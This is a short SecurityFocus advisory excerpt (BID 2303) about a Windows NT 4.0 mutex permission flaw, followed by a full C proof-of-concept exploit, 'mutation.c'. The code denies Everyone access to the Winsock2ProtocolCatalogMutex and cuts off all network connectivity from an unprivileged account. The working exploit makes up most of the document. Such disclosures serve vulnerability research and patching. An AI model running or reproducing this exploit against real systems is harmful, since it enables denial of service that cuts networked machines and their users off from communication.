source: http://www.securityfocus.com/bid/2303/info

Microsoft Windows NT 4.0 is subject to a denial of service due to the implementation of incorrect permissions in a Mutex object. A local user could gain control of the Mutex on a networked machine and deny all network communication. 

/*
/* mutation.c - (c) 2000, Arne Vidstrom, arne.vidstrom@ntsecurity.nu
/*                        http://ntsecurity.nu
/*
/* - Disables all network connectivity through Winsock
/* - Can be run from any account (e.g. an ordinary User account)
/*
*/

#include <windows.h>
#include <aclapi.h>

int main(void)
{
	PSID pEveryoneSID;
	SID_IDENTIFIER_AUTHORITY iWorld = SECURITY_WORLD_SID_AUTHORITY;
	PACL pDacl;
	DWORD sizeNeeded;

	AllocateAndInitializeSid(&iWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);
	sizeNeeded = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) + GetLengthSid(pEveryoneSID) - sizeof(DWORD);
	pDacl = (PACL) malloc(sizeNeeded);
	InitializeAcl(pDacl, sizeNeeded, ACL_REVISION);
	AddAccessDeniedAce(pDacl, ACL_REVISION, GENERIC_ALL, pEveryoneSID);
	SetNamedSecurityInfo("Winsock2ProtocolCatalogMutex", SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pDacl, NULL);
	free(pDacl);
	return 0;
}